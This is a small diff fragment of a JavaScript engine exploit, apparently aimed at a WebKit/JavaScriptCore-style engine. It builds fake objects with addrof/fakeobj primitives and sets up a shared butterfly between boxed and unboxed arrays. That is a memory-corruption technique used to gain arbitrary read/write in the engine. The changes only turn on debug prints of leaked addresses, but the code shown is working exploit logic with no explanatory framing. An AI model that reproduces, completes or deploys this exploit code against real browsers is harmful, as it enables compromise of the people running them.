@@ -603,20 +603,20 @@ function unbox_double(d) {
     unboxed[0] = 4.2; // no CopyOnWrite
 
     var boxed = [{}];
-    //print(`unboxed @ ${hex(stage1.addrof(unboxed))}`);
-    //print(`boxed @ ${hex(stage1.addrof(boxed))}`);
+    print(`unboxed @ ${hex(addrof(unboxed))}`);
+    print(`boxed @ ${hex(addrof(boxed))}`);
 
     var outer = {
         header: flags_contiguous, // cell
         butterfly: victim, // butterfly
     };
-    //print(`outer @ ${hex(stage1.addrof(outer))}`);
+    print(`outer @ ${hex(addrof(outer))}`);
 
     var hax = fakeobj(addrof(outer) + 0x10);
 
     hax[1] = unboxed;
     var shared_butterfly = f2i(victim[1]);
-    //print(`shared butterfly @ ${hex(shared_butterfly)}`);
+    print(`shared butterfly @ ${hex(shared_butterfly)}`);
     hax[1] = boxed;
     victim[1] = i2f(shared_butterfly);
 
